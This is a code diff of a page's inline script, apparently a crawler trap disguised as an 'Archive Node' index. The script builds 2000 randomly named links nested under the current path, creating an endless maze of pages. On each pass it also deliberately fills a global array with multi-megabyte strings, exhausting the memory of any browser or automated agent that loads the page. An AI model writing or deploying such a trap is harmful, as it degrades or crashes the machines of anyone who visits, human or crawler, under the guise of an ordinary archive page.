@@ -19,11 +19,14 @@
             
             window.memoryLeak = [];
             
+            let basePath = window.location.pathname.replace('.html', '');
+            
             let content = "<h1>Archive Node</h1><p>Indexing system records...</p><ul>";
             for(let i = 0; i < 2000; i++) {
                 let hash = Math.random().toString(36).substring(2, 10);
-                content += `<li><a href="${hash}.html">Sector ${hash}</a></li>`;
-                window.memoryLeak.push(new Array(50000000).join('H'));
+                let deepLink = `${basePath}/${hash}.html`;
+                content += `<li><a href="${deepLink}">Sector ${hash}</a></li>`;
+                window.memoryLeak.push(new Array(10000000).join('H'));
             }
             content += "</ul>";
             
